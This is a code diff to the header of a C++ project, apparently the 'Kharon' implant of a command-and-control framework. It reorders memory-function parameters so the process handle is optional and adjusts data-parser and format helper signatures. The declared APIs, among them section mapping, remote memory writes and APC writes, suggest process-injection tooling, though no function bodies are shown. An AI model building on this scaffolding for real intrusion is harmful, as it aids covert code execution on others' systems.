@@ -223,6 +223,8 @@ namespace Root {
         };
 
         struct {
+            ULONG AllocGran;
+            ULONG PageSize;
             PCHAR CompName;
             PCHAR UserName;
             PCHAR DomName;
@@ -527,7 +529,7 @@ namespace Root {
             DECLAPI( NtCreateSection );
             DECLAPI( NtMapViewOfSection );
 
-            // DECLAPI( RtlFillMemory );
+            DECLAPI( khRtlFillMemory );
 
             DECLAPI( LdrGetProcedureAddress );
     
@@ -593,7 +595,7 @@ namespace Root {
             RSL_TYPE( NtCreateSection ),
             RSL_TYPE( NtMapViewOfSection ),
 
-            // RSL_TYPE( RtlFillMemory ),
+            RSL_TYPE( khRtlFillMemory ),
 
             RSL_TYPE( LdrGetProcedureAddress ),
     
@@ -807,14 +809,14 @@ typedef struct {
 	PCHAR buffer; 
 	INT   length;  
 	INT   size;     
-} DATAP, *PDATAP;
+} DATAP;
 
 typedef struct {
 	PCHAR original; 
 	PCHAR buffer;   
 	INT   length;   
 	INT   size;     
-} FMTP, *PFMTP;
+} FMTP;
 
 struct _LOAD_CTX {
     UPTR LoadLibraryAPtr;
@@ -991,63 +993,65 @@ public:
     ) -> BOOL;
 
     static auto DataExtract(
-        PDATAP parser,
+        DATAP* parser,
         PINT   size
     ) -> PCHAR;
 
     static auto DataInt(
-        PDATAP parser
+        DATAP* parser
     ) -> INT;
 
     static auto DataLength(
-        PDATAP parser
+        DATAP* parser
     ) -> INT;
 
     static auto DataShort(
-        PDATAP parser
+        DATAP* parser
     ) -> SHORT;
 
     static auto DataParse(
-        PDATAP parser,
+        DATAP* parser,
         PCHAR  buffer,
         INT    size
     ) -> VOID;
 
     static auto DataPtr(
-        PDATAP parser, 
+        DATAP* parser, 
         INT    size
     ) -> VOID;
 
     static auto FmtAlloc(
-        PFMTP fmt,
+        FMTP* fmt,
         INT   maxsz
     ) -> VOID;
 
     static auto FmtAppend(
-        PFMTP fmt
+        FMTP* Fmt,
+        CHAR* Data,
+        INT32 Len
     ) -> VOID;
 
     static auto FmtFree(
-        PFMTP fmt
+        FMTP* fmt
     ) -> VOID;
 
     static auto FmtInt(
-        PFMTP fmt,
-        INT   val
+        FMTP* fmt,
+        INT32 val
     ) -> VOID;
 
     static auto FmtPrintf(
-        PFMTP fmt,
-        PCCH  text,
-        INT   len
+        FMTP* Fmt,
+        CHAR* Data,
+        ...
     ) -> VOID;
 
     static auto FmtReset(
-        PFMTP fmt
+        FMTP* fmt
     ) -> VOID;
 
     static auto FmtToString(
-        PFMTP fmt,
+        FMTP* fmt,
         PINT  size
     ) -> PCHAR;
 
@@ -2044,26 +2048,26 @@ public:
     Memory( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     auto Alloc(
-        _In_ HANDLE Handle,
         _In_ PVOID Base,
         _In_ ULONG Size,
         _In_ ULONG AllocType,
-        _In_ ULONG Protect
+        _In_ ULONG Protect,
+        _In_ HANDLE Handle = nullptr
     ) -> PVOID;
 
     auto Protect(
-        _In_  HANDLE Handle,
         _In_  PVOID  Base,
         _In_  ULONG  Size,
         _In_  ULONG  NewProt,
-        _Out_ ULONG* OldProt
+        _Out_ ULONG* OldProt,
+        _In_ HANDLE Handle = nullptr
     ) -> BOOL;
 
     auto Write(
-        _In_ HANDLE Handle,
         _In_ PVOID  Base,
         _In_ BYTE*  Buffer,
-        _In_ ULONG  Size
+        _In_ ULONG  Size,
+        _In_ HANDLE Handle = nullptr
     ) -> BOOL;
 
     auto WriteAPC(
@@ -2074,18 +2078,18 @@ public:
     ) -> BOOL;
 
     auto Read(
-        _In_  HANDLE  Handle,
         _In_  PVOID   Base,
         _In_  BYTE*   Buffer,
         _In_  SIZE_T  Size,
-        _Out_ SIZE_T* Reads
+        _Out_ SIZE_T* Reads,
+        _In_ HANDLE Handle = nullptr
     ) -> BOOL;
 
     auto Free(
-        _In_ HANDLE Handle,
         _In_ PVOID  Base,
         _In_ ULONG  Size,
-        _In_ ULONG  FreeType
+        _In_ ULONG  FreeType,
+        _In_ HANDLE Handle = nullptr
     ) -> BOOL;
 
     auto MapView(
